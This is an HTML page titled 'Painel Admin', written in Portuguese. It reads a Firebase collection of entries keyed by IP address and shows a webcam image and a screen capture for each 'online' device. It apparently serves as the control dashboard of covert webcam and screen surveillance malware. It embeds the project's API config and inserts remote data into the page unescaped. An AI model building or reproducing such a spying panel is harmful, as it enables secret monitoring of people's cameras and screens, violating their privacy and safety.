<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Painel Admin</title>
    <style>
        body { background: #111; color: white; font-family: sans-serif; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .box { background: #222; padding: 10px; border-radius: 10px; border: 1px solid #444; }
        img { width: 100%; border-radius: 5px; background: #000; margin-top: 5px; }
        .status { color: #0f0; font-size: 12px; }
    </style>
</head>
<body>
    <h1>Monitoramento Ativo</h1>
    <div id="lista" class="grid"></div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.firestore();

        db.collection("ips_ativos").onSnapshot(snap => {
            const lista = document.getElementById('lista');
            lista.innerHTML = "";
            snap.forEach(doc => {
                const d = doc.data();
                const item = document.createElement('div');
                item.className = "box";
                item.innerHTML = `
                    <div class="status">● ONLINE: ${doc.id}</div>
                    <p>CÂMERA:</p> <img src="${d.camera}">
                    <p>TELA:</p> <img src="${d.tela}">
                `;
                lista.appendChild(item);
            });
        });
    </script>
</body>
</html>
